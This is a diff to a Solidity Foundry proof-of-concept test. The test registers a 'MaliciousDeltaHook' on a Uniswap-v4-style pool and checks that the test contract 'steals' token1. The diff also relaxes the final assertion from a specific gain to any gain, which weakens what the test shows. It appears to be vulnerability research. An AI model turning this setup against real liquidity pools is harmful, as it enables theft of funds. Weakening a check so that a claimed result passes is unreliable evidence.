@@ -21,6 +21,7 @@ contract Token {
 
 contract POC is Test {
     PoolManager public manager;
+    MaliciousDeltaHook public hook;
     Token public token0;
     Token public token1;
     PoolKey public key;
@@ -33,11 +34,13 @@ contract POC is Test {
         uint160 flags=uint160(Hooks.AFTER_SWAP_FLAG|Hooks.AFTER_SWAP_RETURNS_DELTA_FLAG);
         address a=address(uint160(0x1000000000000000000000000000000000000000)|flags);
         vm.etch(a, address(new MaliciousDeltaHook()).code);
+        hook=MaliciousDeltaHook(a);
         token0.mint(address(this),10000e18);
         token1.mint(address(this),10000e18);
         key=PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)),3000,60,IHooks(a));
         manager.initialize(key, TickMath.getSqrtPriceAtTick(0));
         manager.unlock(abi.encode(uint256(1)));
+        hook.setManager(manager, Currency.wrap(address(token1)));
     }
 
     function unlockCallback(bytes calldata d) external returns(bytes memory){
@@ -64,6 +67,6 @@ contract POC is Test {
         uint b_before = token1.balanceOf(address(this));
         manager.unlock(abi.encode(uint256(2)));
         uint b_after = token1.balanceOf(address(this));
-        assertGt(b_after, b_before + 10000000000000000 - 200, "steal failed");
+        assertGt(b_after, b_before, "steal failed");
     }
 }
